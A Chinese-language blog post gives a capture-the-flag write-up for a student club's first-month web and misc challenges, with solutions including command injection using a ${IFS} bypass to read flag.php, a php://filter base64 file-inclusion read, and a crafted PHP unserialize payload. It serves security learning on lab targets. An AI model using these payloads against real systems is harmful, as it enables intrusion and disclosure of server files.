<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> month 1 for cnas writeup · Uknow - Stay hungry Stay foolish</title><meta name="description" content="month 1 for cnas writeup - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">month 1 for cnas writeup</h1><div class="post-time">Dec 9, 2017</div><div class="post-content"><h2 id="签到-50"><a href="#签到-50" class="headerlink" title="签到 50"></a>签到 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001" target="_blank" rel="noopener">http://47.100.121.220:28001</a></p>
<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>这是一个简单的题目，进入页面可以在相应头中找到flag。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%93%8D%E5%BA%94%E5%A4%B4.png" alt=""></p>
<h2 id="02-100"><a href="#02-100" class="headerlink" title="02 100"></a>02 100</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p>
<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>这里的提示是 爬虫什么的，最讨厌了！  所以应该是在说robots.txt文件</p>
<p>另外如果不能想到这个，对于我这种脚本小子。拿到题就是用御剑扫起来。</p>
<p>这里我们可以看到一个图片 Disallow: /2333.png</p>
<p>下载之，这里应该是一个隐身之类的，这里就不用bindwalk跑图片了，直接丢进WinHex下，搜索flag</p>
<p>存在flag.pyc文件，</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pyc.png" alt=""></p>
<p>应该是一个解压包，把.png改成.zip,解压得到flag.pyc</p>
<p>pyc在线反编译，得到python代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"># 访问 http://tool.lu/pyc/ 查看更多信息</span><br><span class="line">print &apos;show me flag&apos;</span><br><span class="line">a = [</span><br><span class="line">    4567249,</span><br><span class="line">    4567259,</span><br><span class="line">    4567254,</span><br><span class="line">    4567248,</span><br><span class="line">    4567244,</span><br><span class="line">    4567169,</span><br><span class="line">    4567183,</span><br><span class="line">    4567252,</span><br><span class="line">    4567175,</span><br><span class="line">    4567171,</span><br><span class="line">    4567250,</span><br><span class="line">    4567169,</span><br><span class="line">    4567174,</span><br><span class="line">    4567170,</span><br><span class="line">    4567183,</span><br><span class="line">    4567253,</span><br><span class="line">    4567183,</span><br><span class="line">    4567183,</span><br><span class="line">    4567182,</span><br><span class="line">    4567250,</span><br><span class="line">    4567170,</span><br><span class="line">    4567168,</span><br><span class="line">    4567252,</span><br><span class="line">    4567170,</span><br><span class="line">    4567173,</span><br><span class="line">    4567172,</span><br><span class="line">    4567183,</span><br><span class="line">    4567172,</span><br><span class="line">    4567252,</span><br><span class="line">    4567171,</span><br><span class="line">    4567251,</span><br><span class="line">    4567169,</span><br><span class="line">    4567182,</span><br><span class="line">    4567173,</span><br><span class="line">    4567168,</span><br><span class="line">    4567183,</span><br><span class="line">    4567175,</span><br><span class="line">    4567183,</span><br><span class="line">    4567173,</span><br><span class="line">    4567174,</span><br><span class="line">    4567183,</span><br><span class="line">    4567251,</span><br><span class="line">    4567249,</span><br><span class="line">    4567170,</span><br><span class="line">    4567251,</span><br><span class="line">    4567242]</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for _ in a:</span><br><span class="line">    flag += chr(_ ^ 4567223)</span><br></pre></td></tr></table></figure>
<p>加个输出 print flag </p>
<p>跑一下，得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/flagpyc.png" alt=""></p>
<h2 id="ping-100"><a href="#ping-100" class="headerlink" title="ping 100"></a>ping 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005/" target="_blank" rel="noopener">http://47.100.121.220:28005/</a></p>
<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>拿到题目应该可以看得出来这是一个命令执行的题目。</p>
<p>这里在提交框填什么都会重定向到05.php?ip=127.0.0.1</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91.png" alt=""></p>
<p>关键在重定向后的这个数据包，这里我们就可以命令执行了</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pingls.png" alt=""></p>
<p>这里不能直接利用cat flag.php </p>
<p>这里我们利用 \${IFS} 绕过 得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/IFS.png" alt=""></p>
<p>原本以为是过滤了空格</p>
<p>后面甜哥告诉我是编码的问题 这里不需要利用 \${IFS} 绕过 也可以读取flag的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat%20flag.php</span><br></pre></td></tr></table></figure>
<h2 id="06-100"><a href="#06-100" class="headerlink" title="06 100"></a>06 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006/06.php" target="_blank" rel="noopener">http://47.100.121.220:28006/06.php</a></p>
<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include($_GET[&apos;file&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里我们可以看出这是一个文件包含的题目，在服务器应该存在一个flag.php文件</p>
<p>试图访问/flag.php是存在的，状态为200。</p>
<p>这样我们就可以利用文件包含来读flag.php的代码了</p>
<p>这里直接包含是不行的，要利用php的伪协议 php://filter 来读取</p>
<p>php伪协议可以参考我的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
<p>直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./flag.php</span><br></pre></td></tr></table></figure>
<p>就可以得到base64加密的flag.php源码了,直接解密，得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/0606060606606.png" alt=""></p>
<h2 id="07-100"><a href="#07-100" class="headerlink" title="07 100"></a>07 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28007/" target="_blank" rel="noopener">http://47.100.121.220:28007/</a></p>
<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>打开链接 直接得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    var $guess;</span><br><span class="line">    var $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (isset($_GET[&apos;k&apos;])) &#123;</span><br><span class="line">    $k = $_GET[&apos;k&apos;];</span><br><span class="line"></span><br><span class="line">    $o = unserialize($k);</span><br><span class="line"></span><br><span class="line">    if ($o) &#123;</span><br><span class="line">        $o-&gt;flag = $flag;</span><br><span class="line">        if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">            echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;wrong!!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;wrong!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>对源码进行分析，可以知道这是一个反序列化的题目，关键的判断在如下代码部分</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag = $flag;</span><br><span class="line">      if ($o-&gt;flag === $o-&gt;guess) &#123;</span><br><span class="line">          echo &quot;Congratulation! &quot;.$o-&gt;flag;</span><br><span class="line">      &#125;</span><br><span class="line">      else &#123;</span><br><span class="line">          echo &quot;wrong!!&quot;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>从代码的理解我们需要做到对象里的flag成员变量的值等于guess的成员变量的值</p>
<p>即 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;flag === $o-&gt;guess</span><br></pre></td></tr></table></figure>
<p>这里我们可以写一个1.php的序列化文件，使我们的类和对象符合题目中的条件，</p>
<p>再利用serialize()函数 序列化得到payload,再把payload赋值给k，由此得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class A &#123;</span><br><span class="line">    var $flag;</span><br><span class="line">    var $guess;</span><br><span class="line">    function A()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;flag=&amp;$this-&gt;guess;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new A());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/serializetest.png" alt=""></p>
<p>得到paylad</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:5:&quot;guess&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>赋值给k,得到flag</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/unserializectf.png" alt=""></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/ctf/week-5-for-cnas-writeup.html" class="prev">PREV</a><a href="/posts/ctf/week-3-for-cnas-writeup.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>